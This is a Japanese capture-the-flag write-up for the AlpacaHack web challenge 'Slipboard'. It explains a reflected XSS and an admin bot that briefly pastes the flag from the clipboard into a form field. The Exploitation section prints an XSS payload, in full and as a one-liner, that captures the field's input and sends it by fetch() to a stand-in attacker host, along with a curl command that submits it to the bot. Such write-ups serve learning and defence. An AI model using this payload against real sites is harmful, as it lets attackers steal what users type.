---
title: Daily-AlpacaHack 「Slipboard」Hard Writeup
description: コーディングミスと反射型XSS
date: 2026-05-31 07:45:00 +0900
categories: [CyberSecurity, CTF]
tags: [alpacahack, web, xss]
---


# 20260530-daily_alpaca-web-hard-Slipboard

> - **Category**: Web
> - **Description**: 間違ってコピペしちゃったけど、すぐ消したから大丈夫！
> - **Tech Stack**: Javascript, Puppeteer
> - **Keyword**: Reflected_XSS, Clipboard, Admin Bot
{: .prompt-info }

**階層構造**
```
.
├── bot
│   ├── bot.js
│   ├── Dockerfile
│   ├── index.js
│   ├── package.json
│   ├── package-lock.json
│   └── views
│       └── index.ejs
├── compose.yaml
└── web
    ├── Dockerfile
    ├── index.js
    ├── package.json
    └── package-lock.json

4 directories, 11 files
```

---
## Solution Path

### エスケープ処理の不足による **Reflected_XSS**

`/` に対してクエリパラメータで指定した文字列が `{{ yours }}` に置換されます．
**エスケープ処理がされておらず，セキュリティヘッダーも未設定** なため，任意のJSを実行することのできる **Reflected XSS** が存在します．

`web/index.js`
```javascript
//...
const html = `
<!DOCTYPE html>
<html>
  <body>
    <form action="/submit" method="post">
      <input id="input" name="name" type="text">
      <input id="submit" type="submit" value="OK">
    </form>
    {{ yours }}
  </body>
</html>
`;

app.get("/", async (req, res) => {
  const page = html.replace('{{ yours }}', req.query.q || '');
  res.send(page);
});
//...
```

### 機密情報漏洩に繋がるコーディングミス

`Report to Admin Bot` のフォームに入力した `path` と `APP_URL` が結合され，`visit()` に渡されます．

`bot/index.js`
```javascript
//...
app.post("/api/report", async (req, res) => {
  const { path } = req.body;
  if (typeof path !== "string") {
    return res.status(400).send("Invalid path");
  }
  const url = APP_URL + path;

  try {
    await visit(url);
    return res.send("OK");
  } catch (e) {
    console.error(e);
    return res.status(500).send("Something wrong");
  }
});
//...
```

`visit()` では，渡された `url` に対して **Headless Chromium** を使用してボットを動作させます．
#### BOTの動作

1. **Flag** が含まれる機密情報を，クリップボードにコピー
2. `page.goto(url, { timeout: 3_000 });` で，渡された `url` にアクセス
3. `url` にある `#input` が付与されたタグの要素に対して，**'間違えて'** 機密情報をペースト
4. ミスで張り付けられた機密情報を全削除
5. ボットが入力した文字列と比較して，入力フォームの値が改竄されていないかをチェックし，されていなければ確定
6. ページを閉じて処理終了

`bot/bot.js`
```javascript
//...
export const visit = async (url) => {
  console.log(`Start visiting: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    pipe: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    // Copy the credentials into the clipboard.
    const page = await context.newPage();
    await page.goto('data:text/html, <html><body><p id="draft" contenteditable>');
    await page.type("#draft", FLAG);
    await page.keyboard.down("Control");
    await page.keyboard.press("A");
    await page.keyboard.press("C");
    await page.keyboard.up("Control");
    await page.close();
  } catch (e) {
    console.error(e);
  }

  try {
    const page = await context.newPage();
    await page.goto(url, { timeout: 3_000 });
    await sleep(1_000);

    await page.focus("#input");
    await page.keyboard.down("Control");
    await page.keyboard.press("V"); // Oops, no, I've accidentally pasted that!
    await page.keyboard.up("Control");

    await page.keyboard.down("Control");
    await page.keyboard.press("A");
    await page.keyboard.up("Control");
    await page.keyboard.press("Backspace"); // ... but deleted it immediately ;-)

    await page.keyboard.type(INPUT_TEXT);
    const data = await page.$eval("#input", ({ value }) => value);
    // We should double-check that it is the intended text.
    if (data === INPUT_TEXT) {
      await page.click("#submit");
    }

    await sleep(1_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`End visiting: ${url}`);
};
//...
```

### Exploitation

一度，**Flag** を含む機密情報が `#input` にペーストされるのであれば，最初に見つけた反射型XSSと組み合わせることで，自身のサーバに対して機密情報を漏洩させることが可能です．
ペイロードをURLエンコードし，`/api/report` に対してポストします．

**Payload**
```javascript
<script>
  const input = document.getElementById('input');
  input.addEventListener('input', (e) => {
    const flag = e.target.value;
    fetch(`<ATTACKER_URL>/?flag=${encodeURIComponent(flag)}`);
  });
</script>

// ワンライナー
<script>const input = document.getElementById('input');input.addEventListener('input', (e) => {const flag = e.target.value;fetch(`<ATTACKER_URL>/?flag=${encodeURIComponent(flag)}`);});</script>
```

```shell
$ curl -X POST http://<ip>:<port>/api/report \
     -H "Content-Type: application/json" \
     -d '{
       "path": "?q=<URL_ENCODED_PAYLOAD>"}'
OK
```

入力されるごとに複数回サーバにアクセスがされ，結果的に **Flag** を含むクエリ文字列が飛んできました．

---
## Post-Mortem & Dead ends

## References
